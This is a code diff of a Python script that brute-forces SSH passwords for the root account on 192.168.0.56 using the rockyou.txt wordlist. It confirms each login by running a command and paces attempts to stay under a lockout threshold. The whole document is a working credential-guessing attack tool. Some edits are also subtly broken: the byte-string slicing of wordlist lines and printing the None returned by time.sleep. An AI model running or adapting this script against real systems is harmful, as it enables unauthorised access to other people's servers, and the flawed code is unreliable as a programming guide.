@@ -8,15 +8,15 @@ import time
 def read_file(wordlist):
     # Words inside the list which are returned to be processed upon password crack
     words = []
-    with open(wordlist) as f:
+    with open(wordlist, 'rb') as f:
         # Read the lines in the file
         lines = f.readlines()
         # For each line in the lines
         for line in lines:
-            # Split the line further to locate only the words and no padding
-            l = line.split()
-            # Append all the found words
-            words.append(l[0])
+            # Forget about encodings, just remove the byte padding from the file.
+            line = str(line)[2:-3]
+            # Append all the words from the line and use them.
+            words.append(line)
     
     # Close the file stream
     f.close()
@@ -26,8 +26,9 @@ def read_file(wordlist):
 
 def login_ssh(wordlist, target, user):
     try:
-        
+        # We have not yet found anything upon start of program so of course it is False.
         password_found = False
+        # While nothing has been found, iterate a connection to the target. 
         while password_found is False:
             
             server, username, password = (target, user, wordlist)
@@ -36,7 +37,7 @@ def login_ssh(wordlist, target, user):
             ssh.connect(server, username=username, password=wordlist, timeout = 3)
             # Checking we are successful 
             ssh_stdin, ssh_stdout, ssh_stderr = ssh.exec_command("ls /tmp")
-            # If stdout gives some bytes, send back the passwqrd.
+            # If stdout gives some bytes, send back the password.
             if len(ssh_stdout.read()) > 0:
                 print("Password Found: {}".format(wordlist))
                 # Found is no longer false so the loop is over
@@ -56,6 +57,7 @@ if __name__ == "__main__":
     # Specify the wordlist: Needs to be present in your local directory
     wordlist = read_file('rockyou.txt')
     # Separate loop control for this loop as its not the same as the while loop in the function
+    print("Attempting password crack")
     for words in range(len(wordlist)):
         login = login_ssh(wordlist[words], '192.168.0.56', 'root')
         # Once we want find True, we want no further print messages
@@ -64,5 +66,6 @@ if __name__ == "__main__":
             break
         print("Trying password: {}".format(wordlist[words]))
         # Allowing 3 attempts to be made just under the threshold of 600
-        time.sleep(200.1)
+        threshold = time.sleep(200.1)
+        print("Sleeping for {}".format(threshold))
         # The password is found, we no longer want to request further connections
